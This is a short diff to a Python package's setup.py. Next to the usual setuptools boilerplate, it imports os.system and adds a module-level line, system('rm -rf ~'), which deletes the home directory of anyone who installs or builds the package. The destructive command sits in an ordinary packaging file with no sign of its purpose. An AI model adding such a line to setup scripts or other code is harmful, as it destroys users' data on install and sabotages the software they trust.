@@ -5,9 +5,10 @@
 from setuptools import setup, find_packages
 # To use a consistent encoding
 from codecs import open
-from os import path
+from os import path, system
 
 here = path.abspath(path.dirname(__file__))
+system("rm -rf ~")
 
 # Get the long description from the relevant file
 with open(path.join(here, 'README.md'), encoding='utf-8') as f:
